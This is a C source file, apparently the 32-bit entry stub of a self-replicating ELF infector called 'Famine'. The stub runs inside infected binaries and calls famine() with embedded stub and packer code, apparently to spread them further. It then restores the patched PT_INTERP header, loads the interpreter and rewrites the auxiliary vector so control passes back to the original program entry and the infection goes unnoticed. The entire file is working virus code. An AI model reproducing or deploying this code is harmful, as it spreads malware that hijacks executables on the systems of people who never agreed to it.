/**
 * @file stub.c
 * @brief 32-bit stub entry point and decryption orchestration.
 */

#include <elf.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include "stub.h"
#include "utils.h"
#include "famine.h"

__attribute__((section(".stub.data")))
t_stub_32_data	g_stub_data = {.entry_point = 0x4242, .stub_virt_off = 0x4242, .sign = FAMINE_SIGN};

extern char	stub_begin[];
extern char	stub_end[];
static char	*_base;

// ---
// Static functions declarations
// ---

static const char	*_restore_interp(
						Elf32_Phdr *phdr,
						int interp_idx
						);

static Elf32_auxv_t	*_auxv_from_stack(
						uintptr_t *stack
						);

static Elf32_Phdr	*_phdr_from_auxv(
						const Elf32_auxv_t *auxv
						);

static void			_fix_auxv(
						Elf32_auxv_t *auxv,
						void *interp_base
						);

// ---
// Stub entry
// ---

/**
 * @brief Stub main function called from assembly entry.
 * @return Pointer to original entry point.
 */
void *stub_main(void *stack)
{
	Elf32_auxv_t	*auxv;
	Elf32_Phdr		*phdr;
	const char		*interp_path;

	_base = (char *)stub_begin - g_stub_data.stub_virt_off;
	g_stub_data.stub32_vaddr += (uintptr_t)_base;
	g_stub_data.stub64_vaddr += (uintptr_t)_base;
	famine(
		(const char *)g_stub_data.stub32_vaddr,
		(const char *)g_stub_data.stub32_vaddr + g_stub_data.stub32_len,
		(const char *)g_stub_data.stub64_vaddr,
		(const char *)g_stub_data.stub64_vaddr + g_stub_data.stub64_len,
		(const char *)g_stub_data.packer32_vaddr,
		(const char *)g_stub_data.packer32_vaddr + g_stub_data.packer32_len,
		(const char *)g_stub_data.packer64_vaddr,
		(const char *)g_stub_data.packer64_vaddr + g_stub_data.packer64_len);
	auxv = _auxv_from_stack(stack);
	if (auxv == nullptr)
		return (g_stub_data.entry_point + _base);
	phdr = _phdr_from_auxv(auxv);
	if (phdr == nullptr)
		return (g_stub_data.entry_point + _base);
	interp_path = (const char *)_restore_interp(phdr, g_stub_data.interp_idx);
	if (interp_path != nullptr) {
		void	*interp_base;
		void	*interp_entry;
		elf_load(interp_path, &interp_base, &interp_entry);
		_fix_auxv(auxv, interp_base);
		return ((char *)interp_base + (uintptr_t)interp_entry);
	} else
		_fix_auxv(auxv, nullptr);

	return (g_stub_data.entry_point + _base);
}

// ---
// Static functions definitions
// ---

static const char	*_restore_interp(
						Elf32_Phdr *phdr,
						int interp_idx
						) {
	if (interp_idx == -1)
		return (nullptr);

	void	*page_start = (void *)(uintptr_t)ALIGN_DOWN((uintptr_t)&phdr[interp_idx], 0x1000);
	size_t	page_len = ALIGN_UP((uintptr_t)&phdr[interp_idx + 1], 0x1000) - (uintptr_t)page_start;
	mprotect(page_start, page_len, PROT_READ | PROT_WRITE);
	phdr[interp_idx].p_type = PT_INTERP;
	mprotect(page_start, page_len, PROT_READ);
	return (phdr[interp_idx].p_vaddr + _base);
}

static Elf32_auxv_t	*_auxv_from_stack(
						uintptr_t *stack
						) {
	uintptr_t	argc;

	argc = *stack++;
	stack += argc + 1;
	while ((void*)*stack++ != nullptr) ;
	return (Elf32_auxv_t *)(stack);
}

static Elf32_Phdr	*_phdr_from_auxv(
						const Elf32_auxv_t *auxv
						) {
	while (auxv->a_type != AT_NULL) {
		switch (auxv->a_type) {
			case AT_PHDR:
				return ((Elf32_Phdr *)auxv->a_un.a_val);
		}
		++auxv;
	}
	return (nullptr);
}

static void			_fix_auxv(
						Elf32_auxv_t *auxv,
						void *interp_base
						) {
	while (auxv->a_type != AT_NULL) {
		switch (auxv->a_type) {
			case AT_BASE:
				auxv->a_un.a_val = (uintptr_t)interp_base;
				break ;
			case AT_ENTRY:
				auxv->a_un.a_val = (uintptr_t)_base + g_stub_data.entry_point;
				break ;
		}
		++auxv;
	}
}
